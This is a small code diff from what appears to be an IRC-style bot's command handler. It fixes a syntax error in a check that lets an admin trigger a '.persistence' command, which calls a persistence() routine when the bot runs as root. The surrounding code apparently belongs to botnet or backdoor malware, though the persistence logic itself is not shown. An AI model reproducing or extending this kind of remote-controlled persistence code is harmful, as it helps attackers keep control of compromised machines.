@@ -699,7 +699,7 @@ def main(): # This is the main function for all of the bot controls.
                     sendntc(message, name)
                                 
                 # Respond to '.persistence' command from admin.
-                if name lower() == adminname.lower() and message.find('.persistence') != -1:
+                if name.lower() == adminname.lower() and message.find('.persistence') != -1:
                     if os.getuid() == 'root':
                         message = "Attempting to create persistence."
                         persistence()
